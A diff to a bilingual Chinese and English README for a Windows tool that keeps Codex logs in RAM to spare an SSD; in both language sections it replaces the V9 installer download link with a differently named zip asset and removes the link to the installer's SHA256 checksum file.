@@ -15,8 +15,7 @@ This repository publishes Codex RAM Log Guard V9: RAM-first operation, a fixed-s
 
 ### 快速下载
 
-- [最新 V9 安装包](https://github.com/Leclerc-Hamilton/Codex-Logs-SSD-Solution/releases/latest/download/Codex-RAMLog-Guard-Windows-V9.zip)
-- [安装包 SHA256](https://github.com/Leclerc-Hamilton/Codex-Logs-SSD-Solution/releases/latest/download/Codex-RAMLog-Guard-Windows-V9.zip.sha256)
+- [最新 V9 安装包](https://github.com/Leclerc-Hamilton/Codex-Logs-SSD-Solution/releases/latest/download/Codex.Logs.SSD.Fix.V9.-.Latest.zip)
 - [全部 Release 资产](https://github.com/Leclerc-Hamilton/Codex-Logs-SSD-Solution/releases/latest)
 
 ### 一键跳转
@@ -29,8 +28,7 @@ Full English instructions are available in [英文版本-Codex-Logs-SSD-Solution
 
 ### Quick download
 
-- [Latest V9 installer](https://github.com/Leclerc-Hamilton/Codex-Logs-SSD-Solution/releases/latest/download/Codex-RAMLog-Guard-Windows-V9.zip)
-- [Installer SHA256](https://github.com/Leclerc-Hamilton/Codex-Logs-SSD-Solution/releases/latest/download/Codex-RAMLog-Guard-Windows-V9.zip.sha256)
+- [Latest V9 installer](https://github.com/Leclerc-Hamilton/Codex-Logs-SSD-Solution/releases/latest/download/Codex.Logs.SSD.Fix.V9.-.Latest.zip)
 - [All Release assets](https://github.com/Leclerc-Hamilton/Codex-Logs-SSD-Solution/releases/latest)
 
 ### One-click navigation
